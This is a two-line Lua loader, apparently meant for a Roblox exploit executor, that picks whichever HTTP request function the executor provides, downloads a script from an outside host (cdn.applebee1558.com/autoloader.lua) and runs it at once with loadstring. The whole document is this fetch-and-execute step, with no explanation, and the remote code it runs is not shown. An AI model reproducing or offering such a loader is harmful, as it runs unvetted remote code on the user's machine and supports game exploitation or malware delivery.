local http_request = http_request or request or (syn and syn.request) or (http and http.request)
loadstring(http_request({Url="https://cdn.applebee1558.com/autoloader.lua", Method="GET"}).Body)()